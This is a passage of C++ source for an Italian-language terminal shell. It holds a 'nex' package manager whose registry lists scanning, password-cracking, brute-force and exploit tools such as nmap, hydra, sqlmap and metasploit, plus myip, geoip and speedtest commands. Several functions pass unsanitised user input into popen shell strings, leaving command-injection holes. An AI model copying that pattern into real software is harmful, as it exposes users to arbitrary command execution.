    row("ls [dir] [-l] [-a]",            "Lista file directory");
    row("cd <dir>",                      "Cambia directory");
    row("pwd",                           "Directory corrente");
    row("cat <file>",                    "Mostra contenuto file");
    row("mkdir <dir>",                   "Crea directory");
    row("rm <file> [-r]",                "Elimina file/directory");
    row("mv <src> <dst>",                "Sposta/rinomina");
    row("cp <src> <dst> [-r]",           "Copia file/directory");
    row("touch <file>",                  "Crea file vuoto");
    row("find <dir> <pattern>",          "Cerca file per nome");
    row("wc <file>",                     "Conta righe/parole/byte");
    row("head <file> [n]",               "Prime N righe");
    row("tail <file> [n]",               "Ultime N righe");
    row("sort <file>",                   "Ordina righe");
    row("uniq <file>",                   "Rimuovi duplicati");
    row("cut <file> -d<sep> -f<col>",    "Estrai colonne");
    row("echo <testo>",                  "Stampa testo");
    row("env",                           "Variabili d'ambiente");
    row("which <cmd>",                   "Percorso di un comando");
    row("chmod <perm> <file>",           "Cambia permessi");
    row("chown <user> <file>",           "Cambia proprietario");
    row("df [-h]",                       "Spazio disco");
    row("du <dir> [-h]",                 "Dimensione directory");
    row("uname [-a]",                    "Info sistema operativo");
    row("whoami",                        "Utente corrente");
    row("date",                          "Data e ora corrente");
    row("uptime",                        "Tempo di attività sistema");
    row("history",                       "Storico comandi sessione");
    row("man <comando>",                 "Manuale di un comando");
    row("python3 [file] [-c code]",      "Esegui Python 3");
    row("pip <install|list|show> [pkg]", "Gestione pacchetti Python");
    row("pip3 <install|list|show> [pkg]","Gestione pacchetti pip3");
    row("sh <script>",                   "Esegui script shell");
    row("run <comando>",                 "Esegui comando di sistema");

    section("NEX — PACKAGE MANAGER");
    row("nex install <tool>",            "Installa tool (brew→GitHub)");
    row("nex remove <tool>",             "Rimuovi tool installato");
    row("nex list",                      "Lista tool installati");
    row("nex search <query>",            "Cerca tool nel registro");
    row("nex info <tool>",               "Info dettagliate su un tool");
    row("nex update [tool]",             "Aggiorna tool o tutti");
    row("nex doctor",                    "Diagnostica ambiente nex");

    section("RETE & SISTEMA LIVE");
    row("myip",                          "IP pubblico e privato");
    row("geoip <ip>",                    "Geolocalizzazione IP");
    row("speedtest",                     "Test velocità connessione");
    row("monitor",                       "Dashboard live CPU/RAM/rete");

    section("TERMINALE");
    row("help",                           "Mostra questo menu");
    row("clear",                          "Pulisci schermo");
    row("exit / quit",                    "Esci");

    std::cout << Color::CYAN << "  ╚══════════════════════════════════════════════════════════╝\n" << Color::RESET << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  NEX — Package Manager
// ═══════════════════════════════════════════════════════════════
// Forward declaration
void runShellCmd(const std::string& cmd);

struct NexTool {
    std::string name;
    std::string description;
    std::string category;
    std::string brew;       // nome formula brew (vuoto se non disponibile)
    std::string github;     // URL repo GitHub (fallback)
    std::string apt;        // nome pacchetto apt (Linux)
    std::string checkCmd;   // comando per verificare se installato
};

// ─── Registro tool disponibili ───
static const std::vector<NexTool> NEX_REGISTRY = {
    // ── Rete & Scanning ──
    {"nmap",       "Network scanner potente",               "network",  "nmap",          "https://github.com/nmap/nmap",              "nmap",       "nmap --version"},
    {"masscan",    "Port scanner ultra-veloce",             "network",  "masscan",       "https://github.com/robertdavidgraham/masscan","masscan",   "masscan --version"},
    {"zmap",       "Scanner Internet-wide",                 "network",  "zmap",          "https://github.com/zmap/zmap",              "zmap",       "zmap --version"},
    {"netcat",     "Swiss Army knife TCP/UDP",              "network",  "netcat",        "",                                          "netcat",     "nc -h"},
    {"socat",      "Relay bidirezionale socket",            "network",  "socat",         "",                                          "socat",      "socat -V"},
    {"tcpdump",    "Analizzatore traffico di rete",         "network",  "tcpdump",       "",                                          "tcpdump",    "tcpdump --version"},
    {"wireshark",  "Analisi pacchetti GUI",                 "network",  "wireshark",     "https://github.com/wireshark/wireshark",    "wireshark",  "wireshark --version"},
    {"curl",       "HTTP client CLI",                       "network",  "curl",          "",                                          "curl",       "curl --version"},
    {"wget",       "Download file HTTP/FTP",                "network",  "wget",          "",                                          "wget",       "wget --version"},
    // ── Web & App Sec ──
    {"sqlmap",     "SQL injection automatizzato",           "web",      "",              "https://github.com/sqlmapproject/sqlmap",    "sqlmap",     "sqlmap --version"},
    {"nikto",      "Web server scanner",                    "web",      "nikto",         "https://github.com/sullo/nikto",            "nikto",      "nikto -Version"},
    {"gobuster",   "Directory/DNS brute-forcer",            "web",      "gobuster",      "https://github.com/OJ/gobuster",            "gobuster",   "gobuster version"},
    {"ffuf",       "Web fuzzer veloce",                     "web",      "ffuf",          "https://github.com/ffuf/ffuf",              "ffuf",       "ffuf -V"},
    {"wfuzz",      "Web fuzzer Python",                     "web",      "",              "https://github.com/xmendez/wfuzz",          "wfuzz",      "wfuzz --version"},
    {"httpie",     "HTTP client user-friendly",             "web",      "httpie",        "https://github.com/httpie/cli",             "httpie",     "http --version"},
    {"burpsuite",  "Proxy intercettazione web",             "web",      "burp-suite",    "",                                          "",           ""},
    // ── Password & Hash ──
    {"hashcat",    "GPU password cracker",                  "crypto",   "hashcat",       "https://github.com/hashcat/hashcat",        "hashcat",    "hashcat --version"},
    {"john",       "John the Ripper password cracker",      "crypto",   "john",          "https://github.com/openwall/john",          "john",       "john --version"},
    {"hydra",      "Brute-force login service",             "crypto",   "hydra",         "https://github.com/vanhauser-thc/thc-hydra","hydra",      "hydra -h"},
    {"medusa",     "Brute-force parallelo",                 "crypto",   "",              "https://github.com/jmk-foofus/medusa",      "medusa",     "medusa --version"},
    // ── Forensica ──
    {"binwalk",    "Analisi firmware e binari",             "forensic", "binwalk",       "https://github.com/ReFirmLabs/binwalk",     "binwalk",    "binwalk --help"},
    {"foremost",   "File carving",                          "forensic", "foremost",      "",                                          "foremost",   "foremost -h"},
    {"volatility", "Analisi memoria RAM",                   "forensic", "volatility",    "https://github.com/volatilityfoundation/volatility3","volatility3","vol -h"},
    {"autopsy",    "Piattaforma forense GUI",               "forensic", "",              "https://github.com/sleuthkit/autopsy",      "autopsy",    ""},
    {"sleuthkit",  "Tool forense CLI",                      "forensic", "sleuthkit",     "https://github.com/sleuthkit/sleuthkit",    "sleuthkit",  "fls -V"},
    {"exiftool",   "Lettura/scrittura metadati",            "forensic", "exiftool",      "https://github.com/exiftool/exiftool",      "libimage-exiftool-perl","exiftool -ver"},
    {"steghide",   "Steganografia JPEG/BMP",                "forensic", "steghide",      "",                                          "steghide",   "steghide --version"},
    {"zsteg",      "Steganografia PNG/BMP",                 "forensic", "",              "https://github.com/zed-0xff/zsteg",         "",           "zsteg --version"},
    // ── Recon & OSINT ──
    {"theHarvester","Raccolta email/domini/IP",             "recon",    "",              "https://github.com/laramies/theHarvester",  "theharvester","theHarvester -h"},
    {"subfinder",  "Enumerazione sottodomini",              "recon",    "subfinder",     "https://github.com/projectdiscovery/subfinder","subfinder","subfinder -version"},
    {"amass",      "Mappatura superficie attacco",          "recon",    "amass",         "https://github.com/owasp-amass/amass",      "amass",      "amass -version"},
    {"shodan",     "CLI per Shodan.io",                     "recon",    "shodan",        "",                                          "python3-shodan","shodan --version"},
    {"dnsx",       "DNS toolkit veloce",                    "recon",    "",              "https://github.com/projectdiscovery/dnsx",  "",           "dnsx -version"},
    {"httprobe",   "Trova host HTTP attivi",                "recon",    "",              "https://github.com/tomnomnom/httprobe",     "",           "httprobe -h"},
    // ── Exploit & Post-Exploitation ──
    {"metasploit", "Framework exploit",                     "exploit",  "metasploit",    "https://github.com/rapid7/metasploit-framework","metasploit-framework","msfconsole --version"},
    {"exploitdb",  "Database exploit locale",               "exploit",  "exploitdb",     "https://github.com/offensive-security/exploitdb","exploitdb","searchsploit --version"},
    // ── Wireless ──
    {"aircrack-ng","Suite audit WiFi",                      "wireless", "aircrack-ng",   "https://github.com/aircrack-ng/aircrack-ng","aircrack-ng","aircrack-ng --help"},
    // ── Dev Tools ──
    {"git",        "Version control",                       "dev",      "git",           "",                                          "git",        "git --version"},
    {"python3",    "Interprete Python 3",                   "dev",      "python3",       "",                                          "python3",    "python3 --version"},
    {"node",       "Runtime Node.js",                       "dev",      "node",          "",                                          "nodejs",     "node --version"},
    {"npm",        "Node package manager",                  "dev",      "npm",           "",                                          "npm",        "npm --version"},
    {"go",         "Linguaggio Go",                         "dev",      "go",            "",                                          "golang-go",  "go version"},
    {"rust",       "Linguaggio Rust",                       "dev",      "rust",          "",                                          "rustc",      "rustc --version"},
    {"docker",     "Container runtime",                     "dev",      "docker",        "",                                          "docker.io",  "docker --version"},
    {"tmux",       "Terminal multiplexer",                  "dev",      "tmux",          "",                                          "tmux",       "tmux -V"},
    {"vim",        "Editor testo avanzato",                 "dev",      "vim",           "",                                          "vim",        "vim --version"},
    {"jq",         "JSON processor CLI",                    "dev",      "jq",            "",                                          "jq",         "jq --version"},
};

// ─── Percorso base nex ───
std::string nexHome() {
    const char* h = getenv("HOME");
    return std::string(h ? h : ".") + "/.nexus";
}

std::string nexBin()  { return nexHome() + "/bin"; }
std::string nexDb()   { return nexHome() + "/installed.txt"; }

void nexEnsureDirs() {
    std::string home = nexHome();
    std::string bin  = nexBin();
    mkdir(home.c_str(), 0755);
    mkdir(bin.c_str(),  0755);
}

// Legge tool installati da file
std::map<std::string,std::string> nexLoadInstalled() {
    std::map<std::string,std::string> db;
    std::ifstream f(nexDb());
    std::string line;
    while (std::getline(f, line)) {
        auto pos = line.find('=');
        if (pos != std::string::npos)
            db[trim(line.substr(0, pos))] = trim(line.substr(pos+1));
    }
    return db;
}

void nexSaveInstalled(const std::map<std::string,std::string>& db) {
    std::ofstream f(nexDb());
    for (auto& p : db) f << p.first << "=" << p.second << "\n";
}

// Cerca tool nel registro
const NexTool* nexFind(const std::string& name) {
    for (auto& t : NEX_REGISTRY)
        if (t.name == toLower(name)) return &t;
    return nullptr;
}

// Verifica se un tool è già installato nel sistema
bool nexIsInstalled(const NexTool& t) {
    if (t.checkCmd.empty()) return false;
    FILE* p = popen((t.checkCmd + " > /dev/null 2>&1").c_str(), "r");
    if (!p) return false;
    int ret = pclose(p);
    return (ret == 0);
}

// ─── Spinner animato ───
void nexSpinner(const std::string& msg, int ms = 1200) {
    const char* frames[] = {"⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"};
    int n = 10;
    for (int i = 0; i < ms/100; i++) {
        std::cout << "\r  " << Color::CYAN << frames[i%n] << " " << Color::WHITE << msg << Color::RESET << std::flush;
        usleep(100000);
    }
    std::cout << "\r" << std::string(msg.size()+6, ' ') << "\r";
}

// ─── Installa tramite brew ───
bool nexInstallBrew(const NexTool& t) {
    FILE* test = popen("which brew > /dev/null 2>&1", "r");
    int ret = pclose(test);
    if (ret != 0) return false;
    if (t.brew.empty()) return false;

    std::cout << Color::YELLOW << "  🍺 Tentativo con Homebrew...\n" << Color::RESET;
    std::string cmd = "brew install " + t.brew + " 2>&1";
    FILE* p = popen(cmd.c_str(), "r");
    if (!p) return false;
    char buf[256];
    while (fgets(buf, sizeof(buf), p))
        std::cout << Color::DIM << "  " << buf << Color::RESET;
    ret = pclose(p);
    return (ret == 0);
}

// ─── Installa tramite apt ───
bool nexInstallApt(const NexTool& t) {
    FILE* test = popen("which apt-get > /dev/null 2>&1", "r");
    int ret = pclose(test);
    if (ret != 0) return false;
    if (t.apt.empty()) return false;

    std::cout << Color::YELLOW << "  📦 Tentativo con apt-get...\n" << Color::RESET;
    std::string cmd = "sudo apt-get install -y " + t.apt + " 2>&1";
    FILE* p = popen(cmd.c_str(), "r");
    if (!p) return false;
    char buf[256];
    while (fgets(buf, sizeof(buf), p))
        std::cout << Color::DIM << "  " << buf << Color::RESET;
    ret = pclose(p);
    return (ret == 0);
}

// ─── Installa tramite git clone ───
bool nexInstallGit(const NexTool& t) {
    if (t.github.empty()) return false;
    nexEnsureDirs();

    std::cout << Color::YELLOW << "  🐙 Clono da GitHub: " << t.github << "\n" << Color::RESET;
    std::string dest = nexHome() + "/" + t.name;
    std::string cmd = "git clone --depth=1 " + t.github + " " + dest + " 2>&1";
    FILE* p = popen(cmd.c_str(), "r");
    if (!p) return false;
    char buf[256];
    while (fgets(buf, sizeof(buf), p))
        std::cout << Color::DIM << "  " << buf << Color::RESET;
    int ret = pclose(p);

    if (ret == 0) {
        // Crea link simbolico in ~/.nexus/bin se esiste un eseguibile
        std::string execPath = dest + "/" + t.name;
        struct stat st;
        if (stat(execPath.c_str(), &st) == 0) {
            std::string link = nexBin() + "/" + t.name;
            symlink(execPath.c_str(), link.c_str());
        }
        return true;
    }
    return false;
}

// ─── CMD: nex ───
void cmdNex(const std::vector<std::string>& args) {
    nexEnsureDirs();
    std::string sub = (args.size() >= 2) ? toLower(args[1]) : "help";

    // ── help ──
    if (sub == "help" || sub == "--help") {
        std::cout << Color::CYAN << "\n  ╔══════════════════════════════════════════════════════════╗\n";
        std::cout << "  ║              NEX — NEXUS PACKAGE MANAGER                 ║\n";
        std::cout << "  ╠══════════════════════════════════════════════════════════╣\n" << Color::RESET;
        auto r = [](const std::string& c, const std::string& d){
            std::cout << Color::CYAN << "  ║ " << Color::BYELLOW << std::left << std::setw(30) << c
                      << Color::WHITE << std::setw(27) << d << Color::CYAN << "║\n" << Color::RESET;
        };
        r("nex install <tool>",   "Installa tool (brew→apt→GitHub)");
        r("nex remove <tool>",    "Rimuovi tool installato");
        r("nex list",             "Lista tool installati");
        r("nex search <query>",   "Cerca tool nel registro");
        r("nex info <tool>",      "Dettagli su un tool");
        r("nex update [tool]",    "Aggiorna tool o tutti");
        r("nex doctor",           "Diagnostica ambiente");
        r("nex registry",         "Mostra tutti i tool disponibili");
        std::cout << Color::CYAN << "  ╚══════════════════════════════════════════════════════════╝\n" << Color::RESET;
        std::cout << Color::DIM << "\n  Tool dir: " << nexHome() << "\n\n" << Color::RESET;
        return;
    }

    // ── install ──
    if (sub == "install") {
        if (args.size() < 3) { std::cout << Color::YELLOW << "  Uso: nex install <tool>\n\n" << Color::RESET; return; }
        std::string name = toLower(args[2]);
        const NexTool* t = nexFind(name);
        if (!t) {
            std::cout << Color::RED << "\n  ❌ Tool '" << name << "' non trovato nel registro.\n";
            std::cout << Color::DIM << "  Usa 'nex search " << name << "' per cercare tool simili.\n\n" << Color::RESET;
            return;
        }

        std::cout << Color::CYAN << "\n  📥 NEX INSTALL: " << Color::BWHITE << t->name << Color::RESET << "\n";
        std::cout << Color::DIM << "  " << t->description << "\n";
        std::cout << "  " << std::string(55,'-') << "\n" << Color::RESET;

        // Controlla se già installato
        if (nexIsInstalled(*t)) {
            std::cout << Color::BGREEN << "  ✅ '" << t->name << "' è già installato!\n\n" << Color::RESET;
            auto db = nexLoadInstalled();
            db[t->name] = "system";
            nexSaveInstalled(db);
            return;
        }

        bool ok = false;

        // 1. Prova brew
        if (!ok) ok = nexInstallBrew(*t);

        // 2. Prova apt
        if (!ok) ok = nexInstallApt(*t);

        // 3. Prova GitHub
        if (!ok) ok = nexInstallGit(*t);

        if (ok) {
            auto db = nexLoadInstalled();
            db[t->name] = t->github.empty() ? "package-manager" : "github";
            nexSaveInstalled(db);
            std::cout << Color::BGREEN << "\n  ✅ '" << t->name << "' installato con successo!\n" << Color::RESET;
            if (!t->checkCmd.empty())
                std::cout << Color::DIM << "  Verifica: " << t->checkCmd << "\n" << Color::RESET;
        } else {
            std::cout << Color::BRED << "\n  ❌ Installazione fallita.\n" << Color::RESET;
            std::cout << Color::DIM << "  Prova manualmente:\n";
            if (!t->brew.empty())   std::cout << "    brew install " << t->brew << "\n";
            if (!t->apt.empty())    std::cout << "    sudo apt install " << t->apt << "\n";
            if (!t->github.empty()) std::cout << "    git clone " << t->github << "\n";
            std::cout << Color::RESET;
        }
        std::cout << "\n";
        return;
    }

    // ── remove ──
    if (sub == "remove" || sub == "uninstall") {
        if (args.size() < 3) { std::cout << Color::YELLOW << "  Uso: nex remove <tool>\n\n" << Color::RESET; return; }
        std::string name = toLower(args[2]);
        auto db = nexLoadInstalled();
        if (!db.count(name)) {
            std::cout << Color::RED << "\n  ❌ '" << name << "' non risulta installato via nex.\n\n" << Color::RESET;
            return;
        }
        std::cout << Color::CYAN << "\n  🗑  NEX REMOVE: " << name << "\n" << Color::RESET;
        std::string src = db[name];

        bool ok = false;
        if (src == "github") {
            std::string dest = nexHome() + "/" + name;
            runShellCmd("rm -rf " + dest);
            std::string link = nexBin() + "/" + name;
            unlink(link.c_str());
            ok = true;
        } else {
            // Prova brew
            FILE* p = popen(("brew uninstall " + name + " 2>&1").c_str(), "r");
            if (p) { char b[256]; while(fgets(b,sizeof(b),p)) std::cout<<Color::DIM<<"  "<<b<<Color::RESET; ok=(pclose(p)==0); }
        }

        if (ok) {
            db.erase(name);
            nexSaveInstalled(db);
            std::cout << Color::BGREEN << "  ✅ '" << name << "' rimosso.\n\n" << Color::RESET;
        } else {
            std::cout << Color::RED << "  ❌ Rimozione fallita.\n\n" << Color::RESET;
        }
        return;
    }

    // ── list ──
    if (sub == "list") {
        auto db = nexLoadInstalled();
        std::cout << Color::CYAN << "\n  📋 TOOL INSTALLATI VIA NEX\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
        if (db.empty()) {
            std::cout << Color::DIM << "  Nessun tool installato. Usa: nex install <tool>\n" << Color::RESET;
        } else {
            for (auto& p : db) {
                const NexTool* t = nexFind(p.first);
                bool alive = t && nexIsInstalled(*t);
                std::cout << (alive ? Color::BGREEN+"  ✅ " : Color::YELLOW+"  ⚠️  ")
                          << Color::WHITE << std::left << std::setw(18) << p.first
                          << Color::DIM << " [" << p.second << "]"
                          << (t ? "  " + t->description : "") << Color::RESET << "\n";
            }
        }
        std::cout << Color::DIM << "\n  Totale: " << db.size() << " tool\n\n" << Color::RESET;
        return;
    }

    // ── search ──
    if (sub == "search") {
        std::string query = (args.size() >= 3) ? toLower(args[2]) : "";
        std::cout << Color::CYAN << "\n  🔍 NEX SEARCH"
                  << (query.empty() ? "" : ": " + query) << "\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(65,'-') << "\n";
        std::cout << "  " << std::left << std::setw(16) << "NOME"
                  << std::setw(12) << "CATEGORIA"
                  << "DESCRIZIONE\n";
        std::cout << "  " << std::string(65,'-') << "\n" << Color::RESET;

        auto db = nexLoadInstalled();
        int shown = 0;
        for (auto& t : NEX_REGISTRY) {
            if (!query.empty() &&
                t.name.find(query)==std::string::npos &&
                t.description.find(query)==std::string::npos &&
                t.category.find(query)==std::string::npos) continue;
            bool inst = db.count(t.name) > 0;
            std::cout << (inst ? Color::BGREEN : Color::WHITE)
                      << "  " << std::left << std::setw(16) << t.name
                      << Color::CYAN << std::setw(12) << t.category
                      << Color::DIM << t.description
                      << (inst ? Color::BGREEN+" ✅" : "")
                      << Color::RESET << "\n";
            shown++;
        }
        std::cout << Color::DIM << "\n  " << shown << " tool trovati\n\n" << Color::RESET;
        return;
    }

    // ── info ──
    if (sub == "info") {
        if (args.size() < 3) { std::cout << Color::YELLOW << "  Uso: nex info <tool>\n\n" << Color::RESET; return; }
        const NexTool* t = nexFind(args[2]);
        if (!t) { std::cout << Color::RED << "  Tool non trovato.\n\n" << Color::RESET; return; }

        auto db = nexLoadInstalled();
        bool inst = nexIsInstalled(*t);

        std::cout << Color::CYAN << "\n  ℹ️  NEX INFO: " << Color::BWHITE << t->name << "\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;
        std::cout << Color::YELLOW << "  Descrizione : " << Color::WHITE << t->description << "\n";
        std::cout << Color::YELLOW << "  Categoria   : " << Color::WHITE << t->category << "\n";
        std::cout << Color::YELLOW << "  Stato       : " << (inst ? Color::BGREEN+"✅ Installato" : Color::RED+"❌ Non installato") << Color::RESET << "\n";
        if (!t->brew.empty())   std::cout << Color::YELLOW << "  Brew        : " << Color::WHITE << "brew install " << t->brew << "\n";
        if (!t->apt.empty())    std::cout << Color::YELLOW << "  Apt         : " << Color::WHITE << "apt install " << t->apt << "\n";
        if (!t->github.empty()) std::cout << Color::YELLOW << "  GitHub      : " << Color::WHITE << t->github << "\n";
        if (!t->checkCmd.empty()) std::cout << Color::YELLOW << "  Check       : " << Color::WHITE << t->checkCmd << "\n";
        if (db.count(t->name))  std::cout << Color::YELLOW << "  Installato via: " << Color::WHITE << db.at(t->name) << "\n";
        std::cout << "\n";
        return;
    }

    // ── update ──
    if (sub == "update") {
        std::string target = (args.size() >= 3) ? toLower(args[2]) : "";
        auto db = nexLoadInstalled();
        if (db.empty()) { std::cout << Color::DIM << "\n  Nessun tool da aggiornare.\n\n" << Color::RESET; return; }

        std::cout << Color::CYAN << "\n  🔄 NEX UPDATE" << (target.empty() ? " — tutti i tool" : ": " + target) << "\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;

        for (auto& p : db) {
            if (!target.empty() && p.first != target) continue;
            const NexTool* t = nexFind(p.first);
            if (!t) continue;
            std::cout << Color::YELLOW << "  Aggiorno: " << Color::WHITE << t->name << "...\n" << Color::RESET;
            if (p.second == "github" && !t->github.empty()) {
                std::string dest = nexHome() + "/" + t->name;
                runShellCmd("git -C " + dest + " pull");
            } else if (!t->brew.empty()) {
                runShellCmd("brew upgrade " + t->brew);
            }
        }
        std::cout << Color::BGREEN << "  ✅ Update completato.\n\n" << Color::RESET;
        return;
    }

    // ── doctor ──
    if (sub == "doctor") {
        std::cout << Color::CYAN << "\n  🩺 NEX DOCTOR — Diagnostica ambiente\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;

        auto chk = [](const std::string& name, const std::string& cmd){
            FILE* p = popen((cmd + " > /dev/null 2>&1").c_str(), "r");
            bool ok = (p && pclose(p)==0);
            std::cout << (ok ? Color::BGREEN+"  ✅ " : Color::RED+"  ❌ ")
                      << Color::WHITE << std::left << std::setw(18) << name
                      << Color::DIM << (ok?"disponibile":"non trovato") << Color::RESET << "\n";
            return ok;
        };

        chk("brew",      "which brew");
        chk("git",       "which git");
        chk("curl",      "which curl");
        chk("python3",   "which python3");
        chk("pip3",      "which pip3");
        chk("apt-get",   "which apt-get");
        chk("go",        "which go");
        chk("node",      "which node");
        chk("docker",    "which docker");

        std::cout << Color::DIM << "\n  Dir nex : " << nexHome() << "\n";
        std::cout << "  Bin dir : " << nexBin() << "\n";
        auto db = nexLoadInstalled();
        std::cout << "  Installati: " << db.size() << " tool\n\n" << Color::RESET;
        return;
    }

    // ── registry ──
    if (sub == "registry") {
        std::cout << Color::CYAN << "\n  📚 NEX REGISTRY — " << NEX_REGISTRY.size() << " tool disponibili\n" << Color::RESET;
        std::string curCat;
        for (auto& t : NEX_REGISTRY) {
            if (t.category != curCat) {
                curCat = t.category;
                std::cout << Color::BRED << "\n  ── " << curCat << " ──\n" << Color::RESET;
            }
            std::cout << Color::YELLOW << "  " << std::left << std::setw(16) << t.name
                      << Color::WHITE << t.description << Color::RESET << "\n";
        }
        std::cout << "\n";
        return;
    }

    std::cout << Color::YELLOW << "  Sottocomando sconosciuto. Usa: nex help\n\n" << Color::RESET;
}

// ═══════════════════════════════════════════════════════════════
//  CMD: myip — IP pubblico e privato
// ═══════════════════════════════════════════════════════════════
void cmdMyIp(const std::vector<std::string>& args) {
    std::cout << Color::CYAN << "\n  🌐 MY IP ADDRESS\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(50,'-') << "\n" << Color::RESET;

    // IP privato tramite interfacce di rete
    std::cout << Color::YELLOW << "  IP Privati:\n" << Color::RESET;
    FILE* p = popen("ifconfig 2>/dev/null || ip addr 2>/dev/null", "r");
    if (p) {
        char buf[256]; std::string iface;
        while (fgets(buf, sizeof(buf), p)) {
            std::string l(buf);
            // Interfaccia
            if (l[0] != ' ' && l[0] != '\t') {
                auto colon = l.find(':');
                if (colon != std::string::npos) iface = trim(l.substr(0, colon));
            }
            // IPv4
            size_t pos = l.find("inet ");
            if (pos != std::string::npos) {
                std::string rest = trim(l.substr(pos+5));
                // Rimuovi maschera /xx o netmask
                auto slash = rest.find('/');
                auto space = rest.find(' ');
                std::string ip = rest.substr(0, std::min(slash, space));
                if (ip != "127.0.0.1")
                    std::cout << Color::GREEN << "    " << std::left << std::setw(12)
                              << iface << Color::WHITE << ip << Color::RESET << "\n";
            }
        }
        pclose(p);
    }

    // IP pubblico tramite curl
    std::cout << Color::YELLOW << "\n  IP Pubblico:\n" << Color::RESET;
    FILE* pub = popen("curl -s --max-time 5 https://api.ipify.org 2>/dev/null", "r");
    if (pub) {
        char buf[64] = {0}; fgets(buf, sizeof(buf), pub); pclose(pub);
        std::string ip = trim(std::string(buf));
        if (!ip.empty())
            std::cout << Color::GREEN << "    " << ip << Color::RESET << "\n";
        else
            std::cout << Color::DIM << "    (nessuna connessione internet)\n" << Color::RESET;
    }
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: geoip — geolocalizzazione IP
// ═══════════════════════════════════════════════════════════════
void cmdGeoIp(const std::vector<std::string>& args) {
    std::string ip;
    if (args.size() < 2) {
        // Usa IP pubblico se non specificato
        FILE* p = popen("curl -s --max-time 5 https://api.ipify.org 2>/dev/null", "r");
        if (p) { char buf[64]={0}; fgets(buf,sizeof(buf),p); pclose(p); ip=trim(buf); }
        if (ip.empty()) { std::cout<<Color::RED<<"  IP non disponibile.\n\n"<<Color::RESET; return; }
    } else {
        ip = args[1];
    }

    std::cout << Color::CYAN << "\n  🗺  GEOIP: " << Color::WHITE << ip << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(50,'-') << "\n" << Color::RESET;

    // Usa ip-api.com (gratuito, no key)
    std::string cmd = "curl -s --max-time 8 \"http://ip-api.com/json/" + ip + "\" 2>/dev/null";
    FILE* p = popen(cmd.c_str(), "r");
    if (!p) { std::cout<<Color::RED<<"  Errore.\n\n"<<Color::RESET; return; }
    char buf[2048]={0}; fgets(buf, sizeof(buf), p); pclose(p);
    std::string json(buf);

    // Parse manuale campi JSON
    auto extract = [&](const std::string& key) -> std::string {
        std::string search = "\"" + key + "\":";
        size_t pos = json.find(search);
        if (pos == std::string::npos) return "";
        pos += search.size();
        if (json[pos]=='"') {
            pos++;
            size_t end = json.find('"', pos);
            return json.substr(pos, end-pos);
        } else {
            size_t end = json.find_first_of(",}", pos);
            return trim(json.substr(pos, end-pos));
        }
    };

    std::string status = extract("status");
    if (status != "success") {
        std::cout << Color::RED << "  IP privato o non trovato.\n\n" << Color::RESET; return;
    }

    auto row = [](const std::string& k, const std::string& v){
        if (!v.empty())
            std::cout << Color::YELLOW << "  " << std::left << std::setw(14) << k
                      << Color::WHITE << v << Color::RESET << "\n";
    };

    row("IP",         extract("query"));
    row("Paese",      extract("country") + " (" + extract("countryCode") + ")");
    row("Regione",    extract("regionName"));
    row("Città",      extract("city"));
    row("CAP",        extract("zip"));
    row("Lat/Lon",    extract("lat") + ", " + extract("lon"));
    row("Timezone",   extract("timezone"));
    row("ISP",        extract("isp"));
    row("Organiz.",   extract("org"));
    row("AS",         extract("as"));

    // Mappa ASCII semplice con coordinata
    double lat = 0, lon = 0;
    try { lat=std::stod(extract("lat")); lon=std::stod(extract("lon")); } catch(...) {}
    if (lat != 0 || lon != 0) {
        int x = (int)((lon + 180.0) / 360.0 * 60);
        int y = (int)((90.0 - lat)  / 180.0 * 20);
        x = std::max(0, std::min(59, x));
        y = std::max(0, std::min(19, y));
        std::cout << Color::DIM << "\n  Posizione approssimativa:\n";
        for (int r=0;r<20;r++) {
            std::cout << "  ";
            for (int c=0;c<60;c++) {
                if (r==y && c==x) std::cout << Color::BRED << "X" << Color::DIM;
                else if (r==0||r==19) std::cout << "─";
                else if (c==0||c==59) std::cout << "│";
                else std::cout << "·";
            }
            std::cout << "\n";
        }
        std::cout << Color::RESET;
    }
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: speedtest — test velocità connessione
// ═══════════════════════════════════════════════════════════════
void cmdSpeedtest(const std::vector<std::string>& args) {
    std::cout << Color::CYAN << "\n  ⚡ SPEEDTEST\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(50,'-') << "\n" << Color::RESET;

    // Ping a server noti
    std::vector<std::pair<std::string,std::string>> servers = {
        {"Google DNS",   "8.8.8.8"},
        {"Cloudflare",   "1.1.1.1"},
        {"OpenDNS",      "208.67.222.222"},
    };

    std::cout << Color::YELLOW << "  Latenza:\n" << Color::RESET;
    for (auto& [name, ip] : servers) {
#ifdef __APPLE__
        std::string cmd = "ping -c 3 -q " + ip + " 2>/dev/null | tail -1";
#else
        std::string cmd = "ping -c 3 -q -W 2 " + ip + " 2>/dev/null | tail -1";
#endif
        FILE* p = popen(cmd.c_str(), "r");
        if (!p) continue;
        char buf[256]={0}; fgets(buf,sizeof(buf),p); pclose(p);
        std::string out = trim(buf);
        // Estrai avg
        std::string avg = "?";
        size_t pos = out.find('/');
        if (pos != std::string::npos) {
            size_t p2 = out.find('/', pos+1);
            if (p2 != std::string::npos) avg = out.substr(pos+1, p2-pos-1);
        }
        double ms = 0; try { ms=std::stod(avg); } catch(...) {}
        std::string col = ms<20?Color::BGREEN:ms<60?Color::YELLOW:Color::RED;
        std::cout << "    " << std::left << std::setw(14) << name
                  << col << avg << " ms" << Color::RESET << "\n";
    }

    // Download speed test con curl
    std::cout << Color::YELLOW << "\n  Download speed:\n" << Color::RESET;
    std::vector<std::pair<std::string,std::string>> dlTests = {
        {"Cloudflare 10MB", "https://speed.cloudflare.com/__down?bytes=10000000"},
        {"Fast.com probe",  "https://api.fast.com/netflix/speedtest"},
    };

    for (auto& [name, url] : dlTests) {
        std::cout << Color::DIM << "    Test: " << name << "..." << Color::RESET << std::flush;
        std::string cmd = "curl -s -o /dev/null -w \"%{speed_download} %{time_total}\" --max-time 10 \"" + url + "\" 2>/dev/null";
